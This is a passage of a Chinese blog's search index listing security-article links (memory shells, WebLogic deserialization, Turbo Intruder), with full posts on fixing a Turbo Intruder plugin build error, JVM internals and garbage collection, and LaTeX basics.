<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>从Java Agent到内存马</title>
      <link href="/2023/05/26/%E4%BB%8EJava%20Agent%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2023/05/26/%E4%BB%8EJava%20Agent%E5%88%B0%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<p>首发于FreeBuf</p><p><a href="https://www.freebuf.com/articles/web/367614.html">https://www.freebuf.com/articles/web/367614.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> 内存马 </tag>
            
            <tag> Java Agent </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PomEye|一款java第三方组件版本识别及漏洞检测GUI工具</title>
      <link href="/2023/05/13/%E4%B8%80%E6%AC%BEjava%E7%AC%AC%E4%B8%89%E6%96%B9%E7%BB%84%E4%BB%B6%E7%89%88%E6%9C%AC%E8%AF%86%E5%88%AB%E5%8F%8A%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8BGUI%E5%B7%A5%E5%85%B7/"/>
      <url>/2023/05/13/%E4%B8%80%E6%AC%BEjava%E7%AC%AC%E4%B8%89%E6%96%B9%E7%BB%84%E4%BB%B6%E7%89%88%E6%9C%AC%E8%AF%86%E5%88%AB%E5%8F%8A%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8BGUI%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p>首发于FreeBuf</p><p><a href="https://www.freebuf.com/sectool/366383.html">https://www.freebuf.com/sectool/366383.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> maven依赖 </tag>
            
            <tag> BeautifulSoup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自己动手写Filter型内存马</title>
      <link href="/2023/05/04/%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2023/05/04/%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<p>首发于FreeBuf</p><p><a href="https://www.freebuf.com/articles/web/365501.html">https://www.freebuf.com/articles/web/365501.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> 内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实战|使用Turbo Intruder寻找短信轰炸漏洞</title>
      <link href="/2023/04/25/%E5%AE%9E%E6%88%98%E4%BD%BF%E7%94%A8TurboIntruder%E5%AF%BB%E6%89%BE%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/04/25/%E5%AE%9E%E6%88%98%E4%BD%BF%E7%94%A8TurboIntruder%E5%AF%BB%E6%89%BE%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>首发于FreeBuf</p><p><a href="https://www.freebuf.com/vuls/364750.html">https://www.freebuf.com/vuls/364750.html</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 逻辑漏洞 </tag>
            
            <tag> 竞争条件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初窥weblogic漏洞之XMLDecoder和T3反序列化漏洞</title>
      <link href="/2023/04/14/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/04/14/%E5%88%9D%E7%AA%A5weblogic%E6%BC%8F%E6%B4%9E%E4%B9%8BXMLDecoder%E5%92%8CT3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>首发于FreeBuf</p><p><a href="https://www.freebuf.com/articles/web/363612.html">https://www.freebuf.com/articles/web/363612.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> weblogic </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burpsuite安装Turbo Intruder插件报错问题</title>
      <link href="/2023/04/07/Burpsuite%E5%AE%89%E8%A3%85Turbo%20Intruder%E6%8F%92%E4%BB%B6%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98/"/>
      <url>/2023/04/07/Burpsuite%E5%AE%89%E8%A3%85Turbo%20Intruder%E6%8F%92%E4%BB%B6%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文末附上修改好并重新编译的jar包</p></blockquote><h1 id="项目场景"><a href="#项目场景" class="headerlink" title="项目场景"></a>项目场景</h1><p>看别人文章时,发现一款神仙插件Turbo Intruder，准备安装下来</p><p>先是在Burpsuite商店安装，发现不能用，使用时报错，然后去github把源码下载下来安装</p><p><a href="https://github.com/PortSwigger/turbo-intruder">https://github.com/PortSwigger/turbo-intruder</a></p><h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>安装后，准备使用它自带的脚本跑一下</p><p><img src="/../images/Burpsuite%E5%AE%89%E8%A3%85TurboIntruder%E6%8F%92%E4%BB%B6%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98.assets/image-20230407103856610.png" alt="image-20230407103856610"></p><p>发现报错，查看日志发现是以下错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">There was an error executing your Python script. This is probably due to a flaw in your script, rather than a bug in Turbo Intruder :)</span><br><span class="line"> If you think it is a Turbo Intruder issue, try out this script: https://raw.githubusercontent.com/PortSwigger/turbo-intruder/master/resources/examples/debug.py </span><br><span class="line">For your convenience, here&#x27;s the full stack trace:</span><br><span class="line">......</span><br><span class="line">UnicodeEncodeError: &#x27;ascii&#x27; codec can&#x27;t encode characters in position 9-11:ordinal not in range(128)</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h1 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h1><p>原因没分析出来，但是在github上发现它的作者说，这种类型的错误可能和jyphon有关系，决定试一试</p><p>在源代码中全局搜索jython</p><p><img src="/../images/Burpsuite%E5%AE%89%E8%A3%85TurboIntruder%E6%8F%92%E4%BB%B6%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98.assets/image-20230407104155113.png" alt="image-20230407104155113"></p><p>这里调用了python解释器，这个kotlin代码实在没看懂，尝试找它的jython的jar包</p><p><img src="/../images/Burpsuite%E5%AE%89%E8%A3%85TurboIntruder%E6%8F%92%E4%BB%B6%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98.assets/image-20230407104224565.png" alt="image-20230407104224565"></p><p>发现它是2.7.0版本，尝试切换到2.7.1版本</p><blockquote><p>这里找到的应该是这个项目的依赖,我们将jython版本更改后，重新编译，他会重新下载jython包</p></blockquote><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>将版本修改为2.7.1</p><p><img src="/../images/Burpsuite%E5%AE%89%E8%A3%85TurboIntruder%E6%8F%92%E4%BB%B6%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98.assets/image-20230407104302053.png" alt="image-20230407104302053"></p><p><font color="red">注意，这里修改的是源代码，我们需要使用工具自己带的脚本再次编译重新生成turbo-intruder.jar文件.</font></p><p><font color="red">windows下编译命令：gradlew.bat build fatjar</font></p><p>然后使用burp重新安装,生成的文件在build&#x2F;libs&#x2F;turbo-intruder-all.jar</p><p><img src="/../images/Burpsuite%E5%AE%89%E8%A3%85TurboIntruder%E6%8F%92%E4%BB%B6%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98.assets/image-20230407104415627.png" alt="image-20230407104415627"></p><p>修改后的turbo-intruder-all.jar：</p><p><a href="https://github.com/feiweiliang/turbo-intruder">https://github.com/feiweiliang/turbo-intruder</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jython </tag>
            
            <tag> Burpsuite </tag>
            
            <tag> Turbo Intruder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JVM那些事儿</title>
      <link href="/2023/04/04/JVM%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/"/>
      <url>/2023/04/04/JVM%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="1-JVM总体框架"><a href="#1-JVM总体框架" class="headerlink" title="1.JVM总体框架"></a>1.JVM总体框架</h1><p><img src="/../images/JVM%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.assets/image-20230315171157354.png" alt="image-20230315171157354"></p><ul><li>方法区和堆是<strong>多线程共享</strong>的(标为<strong>灰色</strong>)</li><li>其他三个是每个<strong>线程都有单独</strong>的(标为<strong>蓝色</strong>)</li></ul><h1 id="2-类加载子系统"><a href="#2-类加载子系统" class="headerlink" title="2.类加载子系统"></a>2.类加载子系统</h1><p><img src="/../images/JVM%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.assets/image-20230315171138943.png" alt="image-20230315171138943"></p><ul><li><strong>验证</strong>：验证待加载的class文件是否正确</li><li><strong>准备</strong>：为static变量分配内存并赋零值</li><li><strong>解析</strong>：将符号引用解析为直接引用</li></ul><h2 id="常见类加载器"><a href="#常见类加载器" class="headerlink" title="常见类加载器"></a>常见类加载器</h2><ul><li>引导类加载器(BootstrapClassLoader)</li><li>自定义类加载器(继承实现了ClassLoader类)<ul><li>ExtClassLoader</li><li>AppClassLoader</li><li>WebAppClassLoader</li></ul></li></ul><h2 id="类加载器加载的目录"><a href="#类加载器加载的目录" class="headerlink" title="类加载器加载的目录"></a>类加载器加载的目录</h2><ul><li>BootstrapClassLoader : <strong>jre&#x2F;lib</strong></li><li>ExtClassLoader :  <strong>jre&#x2F;lib&#x2F;ext</strong></li><li>AppClassLoader :  <strong>classpath</strong></li></ul><h2 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h2><blockquote><p><strong>双亲委派机制：</strong>如果一个类加载器收到了<strong>类加载请求</strong>,它并不会自己先去加载,而是把这个请求<strong>委托给父类的加载器</strong>去执行，<strong>一直向上委托</strong>，<strong>如果不能加载再向下返回</strong>。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ClassLoader类</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)&#123;</span><br><span class="line">    Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">    <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;<span class="comment">//先让它的父类去加载</span></span><br><span class="line">      c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">//parent=null说明其父类是BootstrapClassLoader，使用BootstrapClassLoader来加载</span></span><br><span class="line">      c = findBootstrapClassOrNull(name);</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="literal">null</span>)&#123;<span class="comment">//父类也没加载到，只能自己加载了</span></span><br><span class="line">        c = findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么怎么知道父类是谁呢？在构造Launcher对象时，就给AppClassLoader设置好了parent</p><p><img src="/../images/JVM%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.assets/image-20230315211619218.png" alt="image-20230315211619218"></p><p><img src="/../images/JVM%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.assets/image-20230315211728849.png" alt="image-20230315211728849"></p><p>在构建AppClassLoader对象时调用了父类的构造方法</p><p><img src="/../images/JVM%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.assets/image-20230315211840579.png" alt="image-20230315211840579"></p><p><img src="/../images/JVM%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.assets/image-20230315211858608.png" alt="image-20230315211858608"></p><p><img src="/../images/JVM%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.assets/image-20230315211914968.png" alt="image-20230315211914968"></p><p><img src="/../images/JVM%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.assets/image-20230315211930411.png" alt="image-20230315211930411"></p><p><img src="/../images/JVM%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.assets/image-20230315211943939.png" alt="image-20230315211943939"></p><p>一直到ClassLoader类中，设置了<strong>parent</strong></p><p><strong>双亲委派机制的作用：</strong></p><ul><li>避免类被重复加载</li><li>防止核心API被篡改</li></ul><h2 id="Tomcat自定义类加载器"><a href="#Tomcat自定义类加载器" class="headerlink" title="Tomcat自定义类加载器"></a>Tomcat自定义类加载器</h2><p><strong>为什么tomcat要自定义类加载器：</strong></p><p>若多个web应用拥有同名的类，AppClassLoader 只能加载一个（JVM判断类是否被加载的逻辑为：<font color="red">类名+对应的类加载器实例</font>）。而WebappClassLoader 会为每个应用生成单独的类加载器实例,实现了类加载的隔离。</p><h1 id="3-运行时数据区"><a href="#3-运行时数据区" class="headerlink" title="3.运行时数据区"></a>3.运行时数据区</h1><p><img src="/../images/JVM%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.assets/image-20230317172408166.png" alt="image-20230317172408166"></p><h2 id="程序计数器"><a href="#程序计数器" class="headerlink" title="程序计数器"></a>程序计数器</h2><ul><li>它是每个<strong>线程私有</strong>的，用于存储指向<strong>下一条</strong>字节码指令的地址</li><li>不会发生内存溢出</li></ul><h2 id="虚拟机栈"><a href="#虚拟机栈" class="headerlink" title="虚拟机栈"></a>虚拟机栈</h2><ul><li>每个线程有一个虚拟机栈</li><li>每个方法<strong>执行</strong>都会创建一个栈帧然后<strong>入栈</strong></li><li>方法执行<strong>完毕</strong>会从虚拟机栈中<strong>出栈</strong></li><li>线程太多的话，创建了太多的虚拟机栈，会导致<strong>OutOfMemoryError</strong></li><li>方法调用层次太深的话，创建了太多的栈帧，会导致<strong>StackOverflowError</strong></li></ul><p>虚拟机栈中的<strong>每个栈帧</strong>包含四个部分：</p><ul><li>**局部变量表(Local Variable Table)**是一组变量值存储空间，用于存放方法参数和方法内定义的局部变量。局部变量表的容量以变量槽(Variable Slot)为最小单位，Java虚拟机规范并没有定义一个槽所应该占用内存空间的大小，但是规定了一个槽应该可以存放一个32位以内的数据类型。引用自[此](<a href="https://zhuanlan.zhihu.com/p/45354152">Java虚拟机—栈帧、操作数栈和局部变量表 - 知乎 (zhihu.com)</a>)</li><li>**操作数栈(Operand Stack)**也常称为操作栈，它是一个后入先出栈(LIFO)。</li><li>**动态连接(Dynamic Linking)**是将要调用的方法的符号引用转化为其在内存地址中的直接引用。</li><li><strong>方法返回地址</strong>一般来说，方法正常退出时，调用者的PC计数值可以作为返回地址，栈帧中可能保存此计数值。而方法异常退出时，返回地址是通过异常处理器表确定的，栈帧中一般不会保存此部分信息。</li></ul><p><strong>举一个例子：</strong></p><p>图中为执行指令时操作数栈和局部变量表的变化</p><p><img src="/../images/JVM%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.assets/image-20230318164324518.png" alt="image-20230318164324518"></p><h2 id="本地方法栈"><a href="#本地方法栈" class="headerlink" title="本地方法栈"></a>本地方法栈</h2><p>本地方法栈是jvm的一个组成部分，它用于存储本地方法的调用信息。本地方法是用其他语言（如C或C++）编写的方法，通常用于与操作系统交互。本地方法可以通过Java Native Interface (JNI)或Java Native Access (JNA)来调用。每个新线程都会分配一个单独的本地方法栈。不同的jvm实现可能有不同的方式来处理本地方法栈和Java栈，有些可能共享同一区域，有些可能分开。</p><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p><img src="/../images/JVM%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.assets/image-20230318170831273.png" alt="image-20230318170831273"></p><ul><li>JVM中的堆是用来存储<strong>对象</strong>和<strong>数组</strong>的内存区域</li><li>JVM堆的大小可以通过**-Xms<strong>和</strong>-Xmx**参数来设置，其中-Xms表示堆的初始大小，-Xmx表示堆的最大大小</li><li>JVM会定期执行<strong>垃圾回收</strong>（GC）操作，来清理不可达和即将回收的对象，并释放内存空间。</li></ul><h1 id="4-垃圾回收"><a href="#4-垃圾回收" class="headerlink" title="4.垃圾回收"></a>4.垃圾回收</h1><blockquote><p>目的：防止内存泄露和内存溢出等问题。</p><p>回收的对象： 不再被程序使用的对象，也就是没有被引用的对象。</p><p>回收过程：</p><ul><li>标记垃圾对象：引用计数法，可达性分析法</li><li>垃圾回收： 标记清除法，复制算法，标记整理算法……</li></ul></blockquote><h2 id="引用计数法"><a href="#引用计数法" class="headerlink" title="引用计数法"></a>引用计数法</h2><blockquote><p>每个对象都保存一个引用计数器属性，用于记录对象被引用的次数</p></blockquote><p><strong>优点：</strong>实现简单，实时性好</p><p><strong>缺点：</strong>无法处理循环引用 (两个或多个对象互相引用，形成一个环)</p><h2 id="可达性分析法"><a href="#可达性分析法" class="headerlink" title="可达性分析法"></a>可达性分析法</h2><blockquote><p>JVM会从一组称为“GC Roots”的对象开始，遍历所有可达对象，并将无法到达的对象标记为垃圾对象。</p></blockquote><p><strong>JVM将下列对象视为GC Roots：</strong></p><ul><li>虚拟机栈（栈帧中的本地变量表）中引用的对象</li><li>方法区中类静态属性引用的对象</li><li>方法区中常量引用的对象</li><li>Native方法中JNI引用的对象</li><li>等等</li></ul><p><img src="/../images/JVM%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.assets/image-20230404152259487.png" alt="image-20230404152259487"></p><p>如图所示，蓝色的为可达对象不会被回收。灰色的为循环引用，不能从GCRoot到达。</p><h2 id="标记-清除算法"><a href="#标记-清除算法" class="headerlink" title="标记-清除算法"></a>标记-清除算法</h2><ul><li>标记: Collector从GCRoot开始遍历,标记所有被引用的对象。</li><li>清除: Collector对堆内存从头到尾进行线性的遍历,如果发现某个对象在其Header中没有标记为可达对象,则将其回收。</li></ul><p><img src="/../images/JVM%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.assets/image-20230404154754697.png" alt="image-20230404154754697"></p><p><strong>缺点：</strong></p><ul><li><p>效率不算高</p></li><li><p>在进行GC的时候,需要停止整个应用程序,导致用户体验差</p></li><li><p>产生大量内存碎片</p></li></ul><h2 id="复制算法"><a href="#复制算法" class="headerlink" title="复制算法"></a>复制算法</h2><p>将内存空间分为A、B两块，每次使用一块，垃圾回收时遍历一次目前使用的内存A块，将所有可达对象复制到B块。然后清除A块所有对象，下一次回收再从B复制到A，交换着来。</p><p><img src="/../images/JVM%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.assets/image-20230404161855889.png" alt="image-20230404161855889"></p><p><strong>优点：</strong></p><ul><li>没有标记和清除阶段，通过GC Roots找到可达对象，直接复制，不需要修改对象头，效率高</li><li>不会出现内存碎片</li></ul><p><strong>缺点：</strong></p><ul><li>需要更多的内存，始终有一半的内存空闲</li><li>对象复制后，对象存放的内存地址发生了变化，需要额外的时间修改栈帧中记录的引用地址</li><li>如果可达对象比较多，垃圾对象比较少，那么复制算法的效率就会比较低，所以垃圾对象多的情况下，复制算法比较适合。</li></ul><h2 id="标记-整理算法"><a href="#标记-整理算法" class="headerlink" title="标记-整理算法"></a>标记-整理算法</h2><ul><li><strong>标记</strong>可达对象</li><li><strong>移动</strong>可到对象到内存的一端</li><li><strong>清理</strong>边界外的空间</li></ul><p><img src="/../images/JVM%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.assets/image-20230404165923669.png" alt="image-20230404165923669"></p><p><strong>优点：</strong></p><ul><li>不会出现内存碎片</li><li>也不需要利用额外的内存空间</li></ul><p><strong>缺点：</strong></p><ul><li>效率要低于标记-清除算法、复制算法</li><li>也需要修改栈帧中的引用地址</li></ul><p>图片来源：<a href="https://www.bilibili.com/video/BV1he4y1e7nW?p=23&amp;vd_source=08ec27c446c7fe3ce7235d101b3cbf17">https://www.bilibili.com/video/BV1he4y1e7nW?p=23&amp;vd_source=08ec27c446c7fe3ce7235d101b3cbf17</a></p><p><img src="/../images/JVM%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.assets/image-20230404170023948.png" alt="image-20230404170023948"></p><h2 id="常见的垃圾回收器"><a href="#常见的垃圾回收器" class="headerlink" title="常见的垃圾回收器"></a>常见的垃圾回收器</h2><p>图片来源：<a href="https://www.bilibili.com/video/BV1he4y1e7nW?p=23&amp;vd_source=08ec27c446c7fe3ce7235d101b3cbf17">https://www.bilibili.com/video/BV1he4y1e7nW?p=23&amp;vd_source=08ec27c446c7fe3ce7235d101b3cbf17</a></p><p><img src="/../images/JVM%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF.assets/image-20230404170351412.png" alt="image-20230404170351412"></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> JVM </tag>
            
            <tag> java类加载 </tag>
            
            <tag> 垃圾回收 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>那些年在latex上踩过的坑</title>
      <link href="/2023/03/04/%E9%82%A3%E4%BA%9B%E5%B9%B4%E5%9C%A8latex%E4%B8%8A%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/"/>
      <url>/2023/03/04/%E9%82%A3%E4%BA%9B%E5%B9%B4%E5%9C%A8latex%E4%B8%8A%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>第一次使用latex时踩了很多坑，在此记录一下并梳理一下它的基本用法</p><h1 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h1><p>这里先介绍一下我的latex环境，因为不同的环境下使用可能会有细微的差别</p><p>使用<strong>latex镜像</strong>是: <strong>texlive2022-20220321.iso</strong></p><p>下载地址：<a href="https://mirrors.tuna.tsinghua.edu.cn/CTAN/systems/texlive/Images/">https://mirrors.tuna.tsinghua.edu.cn/CTAN/systems/texlive/Images/</a></p><p><strong>编译器</strong>环境： <strong>TeXstudio 4.2.3</strong></p><img src="/images/那些年在latex上踩过的坑.assets/image-20230304105701973.png" alt="image-20230304105701973" style="zoom:33%;"><p><strong>相关配置</strong>：</p><p><img src="/images/%E9%82%A3%E4%BA%9B%E5%B9%B4%E5%9C%A8latex%E4%B8%8A%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91.assets/image-20230304105801557.png" alt="image-20230304105801557"></p><h1 id="二、基本使用技巧"><a href="#二、基本使用技巧" class="headerlink" title="二、基本使用技巧"></a>二、基本使用技巧</h1><h2 id="1-基本结构"><a href="#1-基本结构" class="headerlink" title="1.基本结构"></a>1.基本结构</h2><p>latex文档的后缀为.tex ， 整体的结构是这样的</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\documentclass</span>&#123;article&#125;</span><br><span class="line"><span class="keyword">\usepackage</span>&#123;ctex&#125; <span class="comment">%%所有的包在这里导入</span></span><br><span class="line"><span class="keyword">\begin</span>&#123;document&#125; <span class="comment">%%正文内容开始标签</span></span><br><span class="line">    正文内容</span><br><span class="line"><span class="keyword">\end</span>&#123;document&#125; <span class="comment">%%正文内容结束标签</span></span><br></pre></td></tr></table></figure><h2 id="2-编译使用"><a href="#2-编译使用" class="headerlink" title="2.编译使用"></a>2.编译使用</h2><p><img src="/images/%E9%82%A3%E4%BA%9B%E5%B9%B4%E5%9C%A8latex%E4%B8%8A%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91.assets/image-20230304110410898.png" alt="image-20230304110410898"></p><p>点这里的build&amp;view，即可编译latex，并在右边栏看到效果</p><p><img src="/images/%E9%82%A3%E4%BA%9B%E5%B9%B4%E5%9C%A8latex%E4%B8%8A%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91.assets/image-20230304152124656.png" alt="image-20230304152124656"></p><h2 id="3-伪代码"><a href="#3-伪代码" class="headerlink" title="3.伪代码"></a>3.伪代码</h2><ul><li>先导包</li></ul><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\usepackage</span>[ruled]&#123;algorithm2e&#125;</span><br></pre></td></tr></table></figure><ul><li>伪代码的latex代码</li></ul><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;algorithm&#125;[hbp]  <span class="comment">%伪代码开始，其中的hbp为伪代码的位置，可以自己调节</span></span><br><span class="line"><span class="keyword">\caption</span>&#123;this is a algorithm&#125; <span class="keyword">\label</span>&#123;algo1&#125; <span class="comment">%算法名字，\label里面的是文中要引用的</span></span><br><span class="line"><span class="keyword">\LinesNumbered</span> <span class="comment">%要求显示行号</span></span><br><span class="line"><span class="keyword">\KwIn</span>&#123;this is input&#125; <span class="comment">%输入</span></span><br><span class="line"><span class="keyword">\KwData</span>&#123;this is data &#125; <span class="comment">%数据</span></span><br><span class="line">print a &quot;hello world&quot;<span class="keyword">\;</span> <span class="comment">% \;用于换行</span></span><br><span class="line"><span class="keyword">\While</span>&#123;条件&#125;&#123; <span class="comment">%while循环</span></span><br><span class="line">print a &quot;hello world&quot;<span class="keyword">\;</span> <span class="keyword">\tcc</span>&#123;这里是注释&#125;</span><br><span class="line"><span class="keyword">\eIf</span>&#123;条件&#125;&#123; <span class="comment">% if else 语句</span></span><br><span class="line">true分支</span><br><span class="line">&#125;&#123;</span><br><span class="line">false分支</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">\end</span>&#123;algorithm&#125;</span><br></pre></td></tr></table></figure><ul><li>文中引用</li></ul><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I have a algorithm <span class="keyword">\ref</span>&#123;algo1&#125;.</span><br></pre></td></tr></table></figure><img src="/images/那些年在latex上踩过的坑.assets/image-20230304152423263.png" alt="image-20230304152423263" style="zoom:50%;"><h2 id="4-图片"><a href="#4-图片" class="headerlink" title="4.图片"></a>4.图片</h2><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\usepackage</span>&#123;graphicx&#125;</span><br></pre></td></tr></table></figure><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;figure*&#125;[htp] <span class="comment">%如果是双栏的,加上*可以使图片横在中间,若果需要图片在一侧就去掉*</span></span><br><span class="line"><span class="keyword">\centering</span> <span class="comment">%图片居中</span></span><br><span class="line"><span class="keyword">\includegraphics</span>[width=2in]&#123;pic/picture.png&#125; <span class="comment">%图片保存到地址和宽度</span></span><br><span class="line"><span class="keyword">\caption</span>&#123;this is a picture.&#125; <span class="keyword">\label</span>&#123;fig1&#125; <span class="comment">%图片标题，lable内为下面引用的名字</span></span><br><span class="line"><span class="keyword">\end</span>&#123;figure*&#125;</span><br></pre></td></tr></table></figure><p>文中引用</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I have a picture <span class="keyword">\ref</span>&#123;fig1&#125;.</span><br></pre></td></tr></table></figure><img src="/images/那些年在latex上踩过的坑.assets/image-20230304155303499.png" alt="image-20230304155303499" style="zoom:50%;"><h2 id="5-表格"><a href="#5-表格" class="headerlink" title="5.表格"></a>5.表格</h2><ul><li>普通表格</li></ul><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 